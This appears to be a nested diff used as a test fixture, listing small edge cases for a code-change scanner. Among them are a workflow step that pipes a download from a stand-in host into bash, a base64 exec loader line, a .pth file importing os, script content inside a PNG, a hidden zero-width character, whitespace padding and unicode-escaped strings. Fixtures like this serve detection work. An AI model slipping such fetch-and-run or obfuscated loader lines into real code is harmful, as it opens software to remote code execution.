@@ -1,0 +1,88 @@
+diff --git a/tests/conftest.py b/tests/conftest.py
+new file mode 100644
+--- /dev/null
++++ b/tests/conftest.py
+@@ -0,0 +1,2 @@
++++i
++x = 1
+diff --git a/old.py b/new.py
+similarity index 90%
+rename from old.py
+rename to new.py
+--- a/old.py
++++ b/new.py
+@@ -1 +1 @@
+-a
++b
+diff --git a/.vscode/launch.json b/.vscode/launch.json
+deleted file mode 100644
+--- a/.vscode/launch.json
++++ /dev/null
+@@ -1 +0,0 @@
+-{}
+diff --git a/tests/data/x.png b/tests/data/x.png
+new file mode 100644
+Binary files /dev/null and b/tests/data/x.png differ
+diff --git a/foo.pth b/foo.pth
+new file mode 100644
+--- /dev/null
++++ b/foo.pth
+@@ -0,0 +1 @@
++import os
+diff --git a/sorl/x.py b/sorl/x.py
+--- a/sorl/x.py
++++ b/sorl/x.py
+@@ -0,0 +1 @@
++exec(base64.b64decode(blob))
+diff --git a/docs/install.rst b/docs/install.rst
+--- a/docs/install.rst
++++ b/docs/install.rst
+@@ -0,0 +1 @@
++    curl -LsSf https://astral.sh/uv/install.sh | sh
+diff --git a/.github/workflows/x.yml b/.github/workflows/x.yml
+--- a/.github/workflows/x.yml
++++ b/.github/workflows/x.yml
+@@ -0,0 +1 @@
++      run: curl -s https://example.com/x | bash
+diff --git a/tests/data/y.png b/tests/data/y.png
+new file mode 100644
+--- /dev/null
++++ b/tests/data/y.png
+@@ -0,0 +1 @@
++console.log(1)
+diff --git a/.vscode/tasks.json b/.vscode/tasks.json
+new file mode 100644
+--- /dev/null
++++ b/.vscode/tasks.json
+@@ -0,0 +1 @@
++{"version": "2.0.0", "tasks": []}
+diff --git a/README.rst b/README.rst
+--- a/README.rst
++++ b/README.rst
+@@ -0,0 +1 @@
++hello​world
+diff --git a/sorl/y.py b/sorl/y.py
+--- a/sorl/y.py
++++ b/sorl/y.py
+@@ -0,0 +1 @@
++                                                                                                    x = 1
+diff --git a/tests/u.py b/tests/u.py
+--- a/tests/u.py
++++ b/tests/u.py
+@@ -0,0 +1 @@
++s = "\u0061\u0062\u0063\u0064"
+diff --git a/tests/v.py b/tests/v.py
+--- a/tests/v.py
++++ b/tests/v.py
+@@ -0,0 +1 @@
++s = R['\u006C\u0065\u006E\u0067\u0074\u0068']
+diff --git a/docs/emoji.md b/docs/emoji.md
+--- a/docs/emoji.md
++++ b/docs/emoji.md
+@@ -0,0 +1 @@
++family 👨‍👩‍👧 and ⚠️
+diff --git a/sorl/thumbnail/engines/pil_engine.py b/sorl/thumbnail/engines/pil_engine.py
+--- a/sorl/thumbnail/engines/pil_engine.py
++++ b/sorl/thumbnail/engines/pil_engine.py
+@@ -0,0 +1 @@
++    image.save(buf, format="PNG")
